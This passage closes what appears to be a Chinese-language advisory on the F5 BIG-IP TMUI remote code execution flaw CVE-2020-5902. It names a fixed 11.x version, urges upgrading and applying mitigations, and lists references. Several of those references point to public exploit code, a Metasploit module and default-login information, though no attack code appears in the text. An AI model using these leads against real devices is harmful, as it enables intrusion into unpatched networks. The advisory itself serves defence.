- BIG-IP 11.x: 11.6.5.2  
  
PS：建议还是能升级的尽量升级，缓解措施则使用以上最新的缓解措施，并随时关注官方的更新  
#### 参考链接  
  
https://github.com/jas502n/CVE-2020-5902/  
  
https://clouddocs.f5.com/api/tmsh/Other.html  
  
https://support.f5.com/csp/article/K52145254  
  
https://github.com/rapid7/metasploit-framework/pull/13807  
  
https://www.criticalstart.com/f5-big-ip-remote-code-execution-exploit/  
  
https://www.pwndefend.com/2020/07/07/configuring-syslog-integration-with-f5-big-ip/  
  
https://research.nccgroup.com/2020/07/05/rift-f5-networks-k52145254-tmui-rce-vulnerability-cve-2020-5902-intelligence/  
  
https://github.com/nccgroup/Cyber-Defence/blob/master/Intelligence/CVE-2020-5902/bypass-iocs.md  
  
https://www.question-defense.com/2011/03/28/f5-big-ip-ltm-ve-default-login-big-ip-local-traffic-manager-virtual-edition-console-login  
  
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf  
  
